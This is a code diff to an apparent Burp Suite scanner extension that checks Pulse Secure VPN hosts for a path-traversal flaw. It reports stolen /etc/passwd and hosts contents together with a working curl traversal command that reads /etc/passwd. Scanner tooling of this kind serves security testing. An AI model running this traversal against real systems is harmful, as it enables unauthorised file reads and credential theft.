@@ -63,6 +63,14 @@ class BurpExtender(IBurpExtender,IScannerCheck):
             print "Connection Error! "
             return ""     
     
+    def altaal(self,data):
+        sonuc=""
+        for m in data.split("\n"):
+            sonuc+=m+"<br>"
+        return sonuc
+            
+            
+
     def doPassiveScan(self, baseRequestResponse):
         my=""
         self.findkey=["/dana-na","Pulse Secure"]
@@ -73,10 +81,11 @@ class BurpExtender(IBurpExtender,IScannerCheck):
                 y=urlparse(x)
                 my=self.etc_getir(y.hostname)
                 if "root:x:0:0:root" in my:
+                    
                     etcpwd = "<p>"+(my)+"</p>"
                     hostsdata=self.host_getir(y.hostname)
                     
-                    text="<p>"+etcpwd+"</p><p>"+hostsdata+"</p> info : <p> curl --path-as-is -s -k \"https://"+y.hostname+"/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/\" </p>"
+                    text=self.altaal(etcpwd)+"</p><p>"+self.altaal(hostsdata)+"</p> info : <p> curl --path-as-is -s -k \"https://"+y.hostname+"/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/\" </p>"
                     
                 
                 #text = ()            
